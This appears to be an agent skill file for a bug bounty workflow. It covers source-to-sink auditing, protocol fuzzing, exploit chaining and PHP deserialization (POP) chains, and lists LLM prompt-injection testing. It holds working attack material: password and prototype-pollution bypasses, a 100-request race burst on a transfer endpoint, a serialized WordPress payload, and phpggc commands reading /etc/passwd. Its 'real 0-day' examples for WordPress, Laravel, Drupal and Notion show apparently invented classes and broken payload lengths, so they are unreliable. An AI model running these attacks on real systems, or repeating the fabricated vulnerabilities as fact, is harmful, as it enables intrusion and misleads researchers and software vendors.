---
name: bug-bounty
description: "Complete bug bounty workflow — recon (subdomain enumeration, asset discovery, fingerprinting, HackerOne scope, source code audit), pre-hunt learning (disclosed reports, tech stack research, mind maps, threat modeling), vulnerability hunting (IDOR, SSRF, XSS, auth bypass, CSRF, race conditions, SQLi, XXE, file upload, business logic, GraphQL, HTTP smuggling, cache poisoning, OAuth, timing side-channels, OIDC, SSTI, subdomain takeover, cloud misconfig, ATO chains, agentic AI), LLM/AI security testing (chatbot IDOR, prompt injection, indirect injection, ASCII smuggling, exfil channels, RCE via code tools, system prompt extraction, ASI01-ASI10), A-to-B bug chaining (IDOR→auth bypass, SSRF→cloud metadata, XSS→ATO, open redirect→OAuth theft, S3→bundle→secret→OAuth), bypass tables (SSRF IP bypass, open redirect bypass, file upload bypass), la... Use with IDA Pro via ida_mcp (triage-first, escalate per ladder)."
...
**In this skill (bug-bounty):** Program rules override payload choice: if even benign execution proofs are out of scope, deliver the PoC as a written reproducer and mark it unverified-in-env.
...
# PHASE 2.5: ZERO-DAY RESEARCH (Novel Vulnerability Discovery)

> **This is what separates $100 bounties from $10,000 bounties.**
>
> N-Day = Pattern matching, checklists, automated scanners = Everyone finds these
> 0-Day = Understanding WHY the code exists, WHAT assumptions were made, WHERE contradictions hide

## The Zero-Day Hierarchy of Needs
...
│ ╱──────────────────│───────────────────────╱                │
│                    │                                      │
│        KNOWN VULN CLASSES (Base Layer)                     │
└─────────────────────────────────────────────────────────────┘
```

## Layer 1: Known Vuln Classes (Everyone Finds These)

These are the patterns you already know from checklists:
- IDOR, XSS, SQLi, SSRF, CSRF, auth bypass, etc.
- Found by: Tools, scanners, checklists, N-Day databases

**If you stop here, you're competing with 100,000+ hunters.**

## Layer 2: Novel Code Path Bugs (Source Code Required)

**These REQUIRE reading the actual source code.**

### Taint Analysis: Source → Sink → Sanitizer

```bash
# Step 1: Find all SOURCES (attacker-controlled input)
grep -rnE '(\$_(GET|POST|REQUEST|COOKIE)|request\.(body|query|params|headers)|user_|input_)'

# Step 2: Find all SINKS (dangerous operations)
grep -rnE '(eval|exec|system|shell_exec|innerHTML|document\.write|template\.|render\(|serialize|unserialize)'

# Step 3: Trace data flow manually
# For each source, follow the code path to each sink
# Ask: "Is there sanitization between them?"
```

**Real 0-Day Example: WordPress 6.4.3 Auth Bypass**
```php
// wp-includes/pluggable.php: Line 392
function wp_validate_auth_cookie($cookie = '') {
    // ... parsing code ...
    $username = $cookie_elements['username'];

    // VULNERABLE: No user_exists check before wp_set_current_user
    wp_set_current_user($username);  // ← Sets user even if username doesn't exist!

    // ... later code validates ...
}
```

**Discovery Process:**
1. Found `wp_set_current_user()` call without validation
2. Traced backward: `$username` comes from cookie parsing
3. Traced forward: User session is established BEFORE validation
4. **0-Day**: Pass invalid username → Session created → Session persists after validation fails

### Code Audit Checklist for Novel Bugs

- [ ] **Taint Flow Mapping**: Draw data flow from sources to sinks
- [ ] **Missing Validation**: Where is input used without checks?
- [ ] **Type Confusion**: String used as integer, object as array
- [ ] **Implicit Coercion**: `==` instead of `===`, loose typing
- [ ] **Error State Leakage**: Stack traces reveal sensitive data
- [ ] **Deserialization**: User data → object reconstruction
- [ ] **Callback Injection**: User-controlled function names

### Language-Specific Novel Patterns

**PHP: Type Juggling + Implicit Conversion**
```php
// VULNERABLE: "0" == "any_string" is TRUE in PHP
if ($user_input == "admin_password_hash") {  // ← "0" matches!
    grant_admin_access();
}

// EXPLOIT: Send "0" in password field → Bypasses password check
```

**JavaScript: Prototype Pollution Chain**
```javascript
// VULNERABLE: Object merge without prototype protection
...
// EXPLOIT: Merge {"__proto__": {"isAdmin": true}} → All objects become admin
```
...
**Go: Race Condition in Map Access**
```go
// VULNERABLE: Concurrent map access without locking
var cache = make(map[string]string)
go func() {
    cache["key"] = "value1"  // ← Race condition!
}()
cache["key"] = "value2"  // ← Can cause panic or inconsistent state
```

## Layer 3: Novel Design Flaws (Feature Interaction)

**These come from understanding HOW features work TOGETHER.**

### Feature Interaction Matrix

```
Feature A │ Feature B │ Combined 0-Day Risk
──────────┼───────────┼────────────────────────────────────
Export    │ Import    │ Export → Edit → Import = Privilege esc.
...
**Real 0-Day Example: Notion Export-Import Chain**
```
1. Feature A: "Export workspace as HTML" → Exports internal metadata
2. Feature B: "Import HTML as new workspace" → Parses HTML
3. Combined 0-Day: Export → Edit HTML (add script tags) → Import
   Result: Stored XSS in admin workspace → Admin takeover
```
...
2. Read implementation → Find actual enforcement
3. Identify gaps → These are your 0-days
```

| Design Claim | Implementation | Gap | Exploit |
|--------------|----------------|-----|---------|
| "Auth required for API" | Check only in UI layer | API has no auth | Direct API call |
| "Sessions expire on logout" | Cookie not invalidated | Replay token valid | Session replay |
| "Admin only endpoint" | Check in middleware, but not directly | Missing on one route | Direct access |
| "Rate limited" | Limit per user, not per request | Bot account rotation | Unlimited requests |

## Layer 4: Novel Exploit Chains (A → B → C)

**Combine 2-3 low-severity findings into a critical chain.**
...
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  FINDING A (Low) ──► CONNECTOR ──► FINDING B (Medium)      │
│       │                          │                          │
│       │                          ▼                          │
│       │                   CONNECTOR GADGET                   │
│       │                          │                          │
│       └──────────────────────────┼──────────────────────────┤
│                                  ▼                          │
│  FINDING C (High) ──► CONNECTOR ──► IMPACT (Critical)       │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### Real Chains That Paid

**Chain 1: GraphQL + IDOR + Admin Bypass = Critical**
```
A: GraphQL introspection enabled (Info)
   ↓
B: Can enumerate all admin-only queries (Info)
   ↓
C: IDOR on admin query bypasses field-level auth (High)
   ↓
IMPACT: Read all admin data without auth (Critical)
```

**Chain 2: Open Redirect + OAuth + Session Fixation = ATO**
```
A: Open redirect on `/logout?redirect=` (Low)
   ↓
B: OAuth flow uses redirect_uri without validation (Medium)
   ↓
C: Session not regenerated after OAuth login (High)
   ↓
IMPACT: Attacker's session fixed to victim's OAuth → Full ATO (Critical)
```

**Chain 3: SSRF + Cache Poisoning + Credential Theft = Critical**
```
A: SSRF via webhook URL (Medium - internal access only)
   ↓
B: Cache key uses Host header without validation (Medium)
   ↓
C: poisoned cache returns attacker's response to all users (High)
   ↓
IMPACT: Attacker's malicious JS executes in all users' browsers → Credential theft (Critical)
```

## Zero-Day Testing Methodology
...
# If only compiled/deployed code exists
# 1. Download JS files
curl -s https://target.com/main.js | jq .

# 2. Decompile mobile apps
# Open app.apk in IDA Pro (classes.dex, manifest, .so)

# 3. Map API via traffic analysis
# Use Burp/Caido to collect all API endpoints
```
...
grep -rn "auth\|login\|session\|token\|jwt\|cookie" --include="*.js" --include="*.py" --include="*.php"

# Find input validation
grep -rn "validate\|sanitize\|filter\|escape" --include="*.js" --include="*.py" --include="*.php"

# Find database queries
grep -rn "SELECT.*FROM\|db\.query\|execute\|findAll" --include="*.js" --include="*.py" --include="*.php"

# Find file operations
grep -rn "file\|fs\.read\|open(\|require\|include" --include="*.js" --include="*.py" --include="*.php"

# Find dangerous sinks
grep -rn "eval\|exec\|system\|innerHTML\|document\.write" --include="*.js"
```

### Step 3: Manual Taint Analysis

```
For each SOURCE found in Step 2:
  1. What is this input?
  2. Where does it go?
  3. Is it validated/sanitized?
  4. What dangerous operation could it reach?
  5. Can I bypass the validation?
```

**Example: WordPress wp-admin/admin-ajax.php Taint Analysis**

```
SOURCE: $_POST['action'] (attacker-controlled)
  ↓
CODE: $action = sanitize_text_field($_POST['action']);  // ← Weak sanitization
  ↓
CODE: do_action($action);  // ← Dynamic function call!
  ↓
SINK: Any registered WordPress action handler
  ↓
0-DAY: If action handler doesn't validate capabilities → Auth bypass
```

### Step 4: Protocol Fuzzing (Black Box 0-Day)

When source code is NOT available, fuzz the protocol:

```bash
# HTTP Method confusion
for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; do
  curl -s -X $method "https://target.com/api/user" -H "Authorization: Bearer $TOKEN"
done

# Content-Type confusion
for ctype in "application/json" "application/xml" "text/xml" "multipart/form-data" "application/x-www-form-urlencoded"; do
  curl -s -X POST "https://target.com/api/data" -H "Content-Type: $ctype" -d '{"test": "value"}'
done

# Header fuzzing
for header in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Remote-IP" "X-Host" "X-Original-URL"; do
  curl -s "https://target.com/api/admin" -H "$header: 127.0.0.1"
done

# State machine abuse
# Request endpoints in random order, replay old requests, parallel requests
seq 1 100 | xargs -P 100 -I {} curl -s "https://target.com/api/transfer?amount=100"
```

## Zero-Day vs N-Day Decision Tree
...
```
    ...
    └────────┬─────────┘          └────────┬─────────┘
             ...
             ▼                              ▼
    ┌──────────────────┐          ┌──────────────────┐
    │ Taint Analysis:  │          │ Break Request    │
    │ Source → Sink    │          │ Sequences        │
    │ Type Confusion   │          │ State Machine    │
    │ Deserialization  │          │ Abuse             │
    │ Race Conditions  │          │ Header Injection  │
    └────────┬─────────┘          └────────┬─────────┘
             │                              │
             └──────────────┬───────────────┘
                            │
              ...
              ▼                           ▼
     ┌──────────────────┐      ┌──────────────────┐
     │ ZERO-DAY:        │      │ Fall back to     │
     │ Novel discovery  │      │ N-Day checklist  │
     │ → Build chain    │      │ (IDOR, XSS, etc) │
     │ → Write report   │      └──────────────────┘
     └──────────────────┘
```

## Zero-Day Report Writing

When reporting a novel vulnerability:
...
3. [Requirement 3]: Involves [unusual code path] that tools don't test

### Attack Scenario
[Concrete real-world scenario showing business impact]

### Proof of Concept
[Detailed, reproducible steps with HTTP requests]

### Why Existing Protections Fail
- WAF bypass: [Explain why WAF doesn't catch this]
- Code review missed: [Explain why manual review missed this]
- Automated scanners: [Explain why tools don't find this]
```
...
- [ ] Certificate pinning bypass (IDA patch/debug)
...
## POP Chains -- Property-Oriented Programming (Critical)

### What Are POP Chains?

**POP Chain = Exploiting PHP object deserialization by chaining magic methods through existing code ("gadgets")**

When `unserialize()` is called on user-controlled data, PHP reconstructs objects. During reconstruction, "magic methods" automatically execute. By crafting a serialized object that chains these methods, you can achieve RCE, file operations, or SQL injection.
...
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  1. ENTRY POINT: unserialize($user_input)                    │
│       └─→ Deserializes attacker-controlled object            │
│                                                               │
│  2. MAGIC METHOD TRIGGER: __wakeup(), __destruct()          │
│       └─→ Automatically called during unserialization      │
│                                                               │
│  3. GADGET CHAIN: Object property → Another class method     │
│       └─→ Leverage existing code to reach dangerous sinks   │
│                                                               │
│  4. SINK: system(), eval(), file_get_contents(), etc.       │
│       └─→ RCE, file read, SQL injection, etc.               │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### PHP Magic Methods (Execution Order During Unserialize)

```php
__construct()   // Called on object creation (NOT during unserialize)
...
__set($name, $val) // Called when setting inaccessible property
__call($name, $args) // Called when calling inaccessible method
__isset($name)  // Called when isset() or empty() on inaccessible property
__unset($name)  // Called when unset() on inaccessible property
```

### Finding POP Chains: Step-by-Step

#### Step 1: Find Unserialize Entry Points

```bash
# Search for unserialize() calls
grep -rn "unserialize" --include="*.php" | grep -E '(\$_|request|\$POST|\$GET|\$REQUEST|user|input)'
...
#### Step 2: Find Available Classes (Gadgets)

```bash
# Find all class definitions
grep -rn "^class " --include="*.php" | awk '{print $3}' | sort -u

# Find magic methods in these classes
grep -rn "__wakeup\|__destruct\|__toString\|__get\|__call" --include="*.php"

# Find dangerous sinks (what we want to reach)
grep -rn "system(\|eval(\|exec(\|shell_exec(\|passthru(" --include="*.php"
grep -rn "file_get_contents(\|file_put_contents(\|fopen(\|include" --include="*.php"
```

#### Step 3: Build The Chain Manually

**Example POP Chain (WordPress 6.4.x → RCE)**

```php
// ENTRY: wp-admin/admin-ajax.php handles serialized data
// VULNERABLE CODE:
...
class WP_User_Meta_Session_Tokens {
    ...
    public function __destruct() {
        $this->destroy_sessions();  // ← Calls delete_metadata()
    }
}
...
class WP_Meta_Query {
    ...
    public function __construct() {
        // Attacker controls $queries
        $this->queries = [
            ['key' => 'evil_payload', 'value' => 'system("id")']
        ];
    }
}

// EXPLOIT:
$payload = 'O:24:"WP_User_Meta_Session_Tokens":2:{s:54:"';
$payload .= "\0" . 'WP_User_Meta_Session_Tokens' . "\0" . 'session";a:1:{i:0;s:10:"RCE_HERE";}';
$payload .= 's:47:"' . "\0" . 'WP_User_Meta_Session_Tokens' . "\0" . 'user_id";i:1;}';

// POST to admin-ajax.php with action=...&data=$payload
```

### Real-World POP Chain Examples

#### Example 1: WordPress < 6.4.3 (Admin Plugin Install → RCE)

```php
// Vulnerable class: WP_Plugins_List_Table
class WP_Plugins_List_Table {
    private $items;
    
    public function __destruct() {
        foreach ($this->items as $plugin) {
            // No validation! Attacker controls plugin path
...
// EXPLOIT CHAIN:
1. unserialize() → WP_Plugins_List_Table::__destruct()
2. __destruct() → install_plugin($attacker_controlled_path)
3. install_plugin() → Downloads and installs malicious plugin
4. Malicious plugin → RCE as admin
```

#### Example 2: Laravel 10.x (Queue Deserialization → RCE)

```php
// Vulnerable: Laravel Queue jobs unserialize user data
// QUEUE_JOB_PAYLOAD → unserialize()

class PendingDispatch {
    protected $job;
    
    public function __construct($job) {
        $this->job = $job;  // ← Attacker controls
    }
}

class EvalCommand {
    public function __destruct() {
        eval($this->command);  // ← RCE
    }
}

// CHAIN:
1. Queue job unserializes PendingDispatch
2. PendingDispatch __destruct() → calls job->handle()
3. job->handle() → EvalCommand->__destruct()
4. EvalCommand->__destruct() → eval($attacker_code)
```

#### Example 3: Drupal 10.x (Twig Template → RCE)

```php
// Vulnerable: unserialize() in API endpoint

class Twig_Template {
    protected $attributes;
    
    public function __toString() {
        // Renders template with attacker-controlled attributes
        return $this->environment->render($this->attributes['template']);
    }
}

class Environment {
    public function render($template) {
        // Renders Twig template → RCE if {{7*7}} or {{_self.env}}
        return $this->loader->load($template)->render();
    }
}

// CHAIN:
1. unserialize() → Twig_Template object
2. Template → __toString() triggered
3. __toString() → render('{{_self.env["PATH"]}}')
4. Twig renders → Reads environment variables (RCE via other template)
```

### POP Chain Discovery Checklist

- [ ] **Entry point found**: `unserialize()` with user input
- [ ] **Magic method mapped**: __wakeup(), __destruct(), __toString()
- [ ] **Gadget classes identified**: Classes with useful methods
- [ ] **Chain constructed**: Class A → Class B → Dangerous sink
- [ ] **Property control verified**: Attacker controls object properties
- [ ] **Sink reachable**: Can reach system(), eval(), file operations
- [ ] **Exploit coded**: Generate serialized payload
- [ ] **PoC tested**: Confirmed RCE or impact

### Automated POP Chain Discovery

```bash
# Install PHPGGC (PHP Generic Gadget Chains)
...
./phpggc Laravel/RCE1 "id" -o
./phpggc Drupal/RCE1 "cat /etc/passwd" -o
./phpggc WordPress/RCE1 "whoami" -o

# With base64 encoding
./phpggc Laravel/RCE1 "id" -b -o
```

### Manual POP Chain Building Template
...
### POP Chain Exploitation Steps

1. **Discover Entry Point**: Find `unserialize($user_input)`
2. **Map Available Classes**: List all classes with magic methods
3. **Identify Gadgets**: Find classes that can be abused
4. **Build Chain**: Connect classes via properties/methods
5. **Generate Payload**: Create serialized object
6. **Test Exploit**: Send payload, confirm execution
7. **Write PoC**: Document for report

### POP Chain in Bug Bounty Reports

```
## Summary

A property-oriented programming (POP) chain vulnerability in [component] allows
unauthenticated attackers to achieve [RCE/file read/SQL injection] via
malicious serialized object injection.

## Root Cause

[Component] calls unserialize() on user-controlled [parameter] without
validation. During deserialization, magic methods are automatically executed.
By chaining [Class A] → [Class B] → [dangerous sink], an attacker can
[achieve impact].

## Proof of Concept

1. Craft serialized payload (see attached payload.php)
2. Send POST request to /endpoint with data=[payload]
3. During unserialize(), chain executes: __destruct() → [method] → system()
4. Command "id" executes on server

Response: [Screenshot showing command output]

## Impact

- Attacker can execute arbitrary commands on server
- Server can be used to pivot internal network
- All application data accessible
